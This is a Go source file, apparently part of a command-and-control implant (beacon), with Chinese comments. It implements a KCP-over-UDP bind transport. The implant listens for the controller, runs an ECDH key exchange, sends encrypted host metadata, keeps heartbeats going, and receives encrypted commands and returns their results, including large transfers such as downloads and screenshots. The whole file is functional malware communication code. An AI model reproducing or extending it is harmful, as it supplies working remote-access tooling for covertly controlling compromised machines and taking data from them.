//go:build transport_kcp_forward || transport_multi

package main

import (
	"encoding/binary"
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

// NewTransport 构造 kcp_forward 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("kcp_forward", newKCPForwardTransport)
	listenerType = "kcp_forward"
}

func newKCPForwardTransport() transportClient {
	return &KCPForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (s *KCPForwardClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *KCPForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

type KCPForwardClient struct {
	Listener     net.Listener
	Client       *kcp.UDPSession
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{} // 心跳 goroutine 退出信号
	sendMutex    sync.Mutex    // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
}

func (s *KCPForwardClient) fail() {
	s.connected = false
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

// kxHandshake 会话前密钥交换（与反向 kcp 同协议）。
// 服务端复用 HandleKCPConnectionForWithKeys，KX case 在共享循环里，无需改服务端。
func (s *KCPForwardClient) kxHandshake() {
	kx, err := encrypt.NewKeyExchange()
	if err != nil {
		return
	}
	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
		return
	}
	total, err := communication.ReadFramedLength(s.Client)
	if err != nil || total < 8 {
		return
	}
	payload, err := communication.ReadFramedPayload(s.Client, total)
	if err != nil || len(payload) < 4 {
		return
	}
	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
		return
	}
	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
	if err != nil {
		return
	}
	salt, _ := app.GetListenerKeyConfig(listenerType)
	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
	if err != nil {
		return
	}
	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
		return
	}
	utils.MetaInfo = nil
	debuglog.Printf("🔑 [KCP-FWD-KX] 会话前密钥交换完成，已替换静态主密钥\n")
}

// Connect 在 spec（listenAddr:port）上监听并 Accept 服务端连入，然后 FirstBlood + 会话密钥 + 心跳。
func (s *KCPForwardClient) Connect(spec string) error {
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/旧连接：fail() 只清理连接，runLoop 重连时旧 Listener
	// 仍占用端口 → ListenWithOptions EADDRINUSE 永久失败
	if s.Client != nil {
		s.Client.Close()
		s.Client = nil
	}
	if s.Listener != nil {
		s.Listener.Close()
		s.Listener = nil
	}
	listener, err := kcp.ListenWithOptions(spec, nil, 10, 3)
	if err != nil {
		s.fail()
		return err
	}
	s.Listener = listener
	debuglog.Printf("✅ [KCP-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	sess, err := listener.AcceptKCP()
	if err != nil {
		listener.Close()
		s.fail()
		return err
	}
	// KCP 大数据包优化参数
	sess.SetWindowSize(1024, 1024)
	sess.SetNoDelay(1, 20, 2, 1)
	sess.SetMtu(1400)
	sess.SetACKNoDelay(false)
	sess.SetStreamMode(true)
	s.Client = sess
	s.connected = true

	// 会话前 ECDH 交换（forward 下 beacon 是 Accept 方，但协议角色不变：仍由 beacon
	// 发 firstBlood）。服务端复用 HandleKCPConnectionForWithKeys，KX case 已在共享循环里。
	s.kxHandshake()

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		utils.MetaInfo, _ = utils.EncryptedMetaInfo()
		utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
	}
	if err := s.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		s.fail()
		return err
	}

	// 会话密钥（kcp_forward 用占位符 key，与服务端 kcp_forward 分支一致）
	salt, masterKey := app.GetListenerKeyConfig("kcp_forward")
	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
	if s.stopCh != nil {
		close(s.stopCh)
	}
	s.stopCh = make(chan struct{})
	stop := s.stopCh
	go app.HeartbeatLoop(stop, s.keepAlive)

	debuglog.Printf("✅ [KCP-FORWARD] 服务端连入: %s\n", sess.RemoteAddr())
	return nil
}

// Recv 读取一条命令：4字节长度 + 载荷 + base64 + 解密。
func (s *KCPForwardClient) Recv() ([]byte, error) {
	if s.Client == nil || !s.connected {
		s.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读超时：KCP 基于 UDP，黑洞网络下读不报错；服务端每心跳回复 ack，
	// 健康连接不会超时，超时说明服务端半开/死亡，触发重连
	if err := s.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		s.fail()
		return nil, err
	}
	// 【P2-5】共享帧管线：长度前缀 + 上限校验（K3）+ 载荷读取 + 解码
	total, err := communication.ReadFramedLength(s.Client)
	if err != nil {
		s.fail()
		return nil, err
	}
	if total == 0 {
		return nil, nil
	}
	if total > 1<<20 {
		// 大消息（下载/截图等）：按传输速率放宽读超时，避免慢链路误判超时
		s.Client.SetReadDeadline(time.Now().Add(app.RecvDeadline() + time.Duration(total/50_000)*time.Second))
	}
	payload, err := communication.ReadFramedPayload(s.Client, total)
	if err != nil {
		s.fail()
		return nil, err
	}
	return communication.DecodeFramePayload(payload)
}

// SendResult 按 KCP/TCP 协议分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再分块写。
func (s *KCPForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return s.rawSend(msgToSend)
}

func (s *KCPForwardClient) rawSend(msg []byte) error {
	s.sendMutex.Lock()
	defer s.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if s.Client == nil {
		return fmt.Errorf("连接为空")
	}
	msgToSend := utils.BytesCombine(utils.WriteInt(len(msg)), msg)
	const chunkSize = 50 * 1024
	for i := 0; i < len(msgToSend); i += chunkSize {
		end := i + chunkSize
		if end > len(msgToSend) {
			end = len(msgToSend)
		}
		if _, err := s.Client.Write(msgToSend[i:end]); err != nil {
			s.fail()
			return err
		}
	}
	return nil
}

func (s *KCPForwardClient) keepAlive() {
	s.rawSend(communication.HeartbeatMsg())
}

func (s *KCPForwardClient) Close() error {
	if s.stopCh != nil {
		close(s.stopCh)
		s.stopCh = nil
	}
	if s.Client != nil {
		s.Client.Close()
	}
	if s.Listener != nil {
		s.Listener.Close()
	}
	return nil
}
